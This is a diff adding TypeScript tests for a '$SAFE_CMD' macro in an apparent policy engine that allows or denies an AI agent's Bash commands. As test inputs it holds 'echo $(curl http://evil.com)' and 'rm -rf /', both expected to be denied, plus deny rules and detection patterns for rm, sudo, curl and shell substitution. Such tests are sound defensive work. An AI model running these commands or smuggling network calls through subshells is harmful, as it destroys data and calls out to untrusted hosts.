@@ -1118,3 +1118,326 @@ describe("rules without $SAFE/$UNSAFE (regression)", () => {
         expect(matches_rule(rule, "Write", {}, ctx)).toBe(false);
     });
 });
+
+// ---------------------------------------------------------------------------
+// $SAFE_CMD macro
+// ---------------------------------------------------------------------------
+
+describe("substitute_variables $SAFE_CMD", () => {
+    it("produces named capture group with lazy quantifier", () => {
+        const result = substitute_variables("^$SAFE_CMD end", "/cwd");
+        expect(result).toContain("(?<__safe_cmd_0__>.+?)");
+    });
+
+    it("assigns unique indices to multiple $SAFE_CMD", () => {
+        const result = substitute_variables("$SAFE_CMD and $SAFE_CMD", "/cwd");
+        expect(result).toContain("__safe_cmd_0__");
+        expect(result).toContain("__safe_cmd_1__");
+    });
+
+    it("does not interfere with $SAFE replacement", () => {
+        const result = substitute_variables("$SAFE_CMD > $SAFE/", "/cwd");
+        expect(result).toContain("__safe_cmd_0__");
+        expect(result).toContain("__safe_0__");
+    });
+
+    it("is skipped when skip_safe_cmd is true", () => {
+        const result = substitute_variables("$SAFE_CMD", "/cwd", true);
+        expect(result).toContain("$SAFE_CMD");
+        expect(result).not.toContain("__safe_cmd_");
+    });
+});
+
+describe("$SAFE_CMD redirect evaluation", () => {
+    // Policies with safe commands + the redirect rule
+    function make_redirect_policies(): PoliciesFile {
+        return {
+            version: 2,
+            rules: [
+                {
+                    id: "allow-safe-redirect",
+                    tool: "Bash",
+                    match: { command: "^$SAFE_CMD >+ *$SAFE" },
+                    action: "allow",
+                    priority: 62,
+                    description: "Allow safe commands with redirect to safe dir",
+                    acknowledged_risks: ["risk-redirect"],
+                },
+                {
+                    id: "allow-system-info",
+                    tool: "Bash",
+                    match: { command: "^(ls|echo|date|cat)\\b" },
+                    action: "allow",
+                    priority: 60,
+                    description: "Allow safe commands",
+                },
+                {
+                    id: "deny-dangerous",
+                    tool: "Bash",
+                    match: { command: "^(rm|sudo)\\b" },
+                    action: "deny",
+                    priority: 100,
+                    description: "Deny dangerous commands",
+                },
+            ],
+            known_risks: [
+                {
+                    id: "risk-redirect",
+                    tool: "Bash",
+                    match: { command: "[^2]>(?!/dev/null)" },
+                    risk: "Output redirect",
+                    severity: "acknowledge",
+                },
+            ],
+            safe_directories: ["/tmp", "$CWD"],
+            unsafe_directories: ["$NOTCWD"],
+        };
+    }
+
+    const CWD = "/home/user/project";
+
+    it("allows safe command redirected to safe directory", () => {
+        const result = evaluate(
+            make_redirect_policies(), [], "Bash",
+            { command: "ls > /tmp/out.txt" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("allows echo with append redirect to safe directory", () => {
+        const result = evaluate(
+            make_redirect_policies(), [], "Bash",
+            { command: "echo hello >> /tmp/log.txt" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("denies safe command redirected to unsafe directory", () => {
+        const result = evaluate(
+            make_redirect_policies(), [], "Bash",
+            { command: "ls > /etc/out.txt" }, CWD,
+        );
+        expect(result.decision).toBe("deny");
+    });
+
+    it("denies dangerous command redirected to safe directory", () => {
+        // rm is denied, so SAFE_CMD recursive eval fails
+        const result = evaluate(
+            make_redirect_policies(), [], "Bash",
+            { command: "rm -rf / > /tmp/out.txt" }, CWD,
+        );
+        expect(result.decision).toBe("deny");
+    });
+
+    it("allows redirect to CWD-relative safe path", () => {
+        const result = evaluate(
+            make_redirect_policies(), [], "Bash",
+            { command: "date > /home/user/project/timestamp.txt" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+});
+
+describe("$SAFE_CMD subshell evaluation", () => {
+    function make_subshell_policies(): PoliciesFile {
+        return {
+            version: 2,
+            rules: [
+                {
+                    id: "allow-safe-subshell",
+                    tool: "Bash",
+                    match: { command: "^$SAFE_CMD \\$\\($SAFE_CMD\\)$" },
+                    action: "allow",
+                    priority: 62,
+                    description: "Allow commands with safe $() subshells",
+                    acknowledged_risks: ["risk-metachar-injection"],
+                },
+                {
+                    id: "allow-system-info",
+                    tool: "Bash",
+                    match: { command: "^(ls|echo|date|cat|wc)\\b" },
+                    action: "allow",
+                    priority: 60,
+                    description: "Allow safe commands",
+                },
+            ],
+            known_risks: [
+                {
+                    id: "risk-metachar-injection",
+                    tool: "Bash",
+                    match: { command: "\\$\\(|`[^`]*`|\\$\\{" },
+                    risk: "Shell substitution",
+                    severity: "escalate",
+                },
+                {
+                    id: "risk-network",
+                    tool: "Bash",
+                    match: { command: "(^|[;&|] *)curl\\b" },
+                    risk: "Network request",
+                    severity: "escalate",
+                },
+            ],
+            safe_directories: ["/tmp"],
+        };
+    }
+
+    const CWD = "/home/user/project";
+
+    it("allows echo $(date) when both are safe", () => {
+        const result = evaluate(
+            make_subshell_policies(), [], "Bash",
+            { command: "echo $(date)" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("denies echo $(curl http://evil.com) — inner command has unacknowledged risk", () => {
+        const result = evaluate(
+            make_subshell_policies(), [], "Bash",
+            { command: "echo $(curl http://evil.com)" }, CWD,
+        );
+        expect(result.decision).toBe("deny");
+    });
+
+    it("allows wc -l $(cat file)", () => {
+        const result = evaluate(
+            make_subshell_policies(), [], "Bash",
+            { command: "wc -l $(cat file)" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("denies when outer command is unknown", () => {
+        const result = evaluate(
+            make_subshell_policies(), [], "Bash",
+            { command: "unknown_cmd $(date)" }, CWD,
+        );
+        expect(result.decision).toBe("deny");
+    });
+});
+
+describe("$SAFE_CMD depth limiting", () => {
+    // Policy that allows nested subshells via SAFE_CMD
+    function make_nested_policies(): PoliciesFile {
+        return {
+            version: 2,
+            rules: [
+                {
+                    id: "allow-safe-subshell",
+                    tool: "Bash",
+                    match: { command: "^$SAFE_CMD \\$\\($SAFE_CMD\\)$" },
+                    action: "allow",
+                    priority: 62,
+                    description: "Allow safe subshells",
+                    acknowledged_risks: ["risk-metachar-injection"],
+                },
+                {
+                    id: "allow-system-info",
+                    tool: "Bash",
+                    match: { command: "^(echo|date)\\b" },
+                    action: "allow",
+                    priority: 60,
+                    description: "Allow safe commands",
+                },
+            ],
+            known_risks: [
+                {
+                    id: "risk-metachar-injection",
+                    tool: "Bash",
+                    match: { command: "\\$\\(|`[^`]*`|\\$\\{" },
+                    risk: "Shell substitution",
+                    severity: "escalate",
+                },
+            ],
+        };
+    }
+
+    const CWD = "/home/user/project";
+
+    it("allows one level of nesting", () => {
+        const result = evaluate(
+            make_nested_policies(), [], "Bash",
+            { command: "echo $(date)" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("allows two levels of nesting (within depth limit)", () => {
+        const result = evaluate(
+            make_nested_policies(), [], "Bash",
+            { command: "echo $(echo $(date))" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+});
+
+describe("$SAFE_CMD combined with $SAFE", () => {
+    function make_combined_policies(): PoliciesFile {
+        return {
+            version: 2,
+            rules: [
+                {
+                    id: "allow-safe-redirect",
+                    tool: "Bash",
+                    match: { command: "^$SAFE_CMD >+ *$SAFE" },
+                    action: "allow",
+                    priority: 62,
+                    description: "Allow safe redirect to safe dir",
+                    acknowledged_risks: ["risk-redirect", "risk-metachar-injection"],
+                },
+                {
+                    id: "allow-safe-subshell",
+                    tool: "Bash",
+                    match: { command: "^$SAFE_CMD \\$\\($SAFE_CMD\\)$" },
+                    action: "allow",
+                    priority: 62,
+                    description: "Allow safe subshells",
+                    acknowledged_risks: ["risk-metachar-injection"],
+                },
+                {
+                    id: "allow-system-info",
+                    tool: "Bash",
+                    match: { command: "^(echo|date|ls)\\b" },
+                    action: "allow",
+                    priority: 60,
+                    description: "Allow safe commands",
+                },
+            ],
+            known_risks: [
+                {
+                    id: "risk-redirect",
+                    tool: "Bash",
+                    match: { command: "[^2]>(?!/dev/null)" },
+                    risk: "Redirect",
+                    severity: "acknowledge",
+                },
+                {
+                    id: "risk-metachar-injection",
+                    tool: "Bash",
+                    match: { command: "\\$\\(|`[^`]*`|\\$\\{" },
+                    risk: "Shell substitution",
+                    severity: "escalate",
+                },
+            ],
+            safe_directories: ["/tmp"],
+        };
+    }
+
+    const CWD = "/home/user/project";
+
+    it("allows echo $(date) > /tmp/out.txt — both macros in play", () => {
+        const result = evaluate(
+            make_combined_policies(), [], "Bash",
+            { command: "echo $(date) > /tmp/out.txt" }, CWD,
+        );
+        expect(result.decision).toBe("allow");
+    });
+
+    it("denies echo $(date) > /etc/out.txt — $SAFE validation fails", () => {
+        const result = evaluate(
+            make_combined_policies(), [], "Bash",
+            { command: "echo $(date) > /etc/out.txt" }, CWD,
+        );
+        expect(result.decision).toBe("deny");
+    });
+});
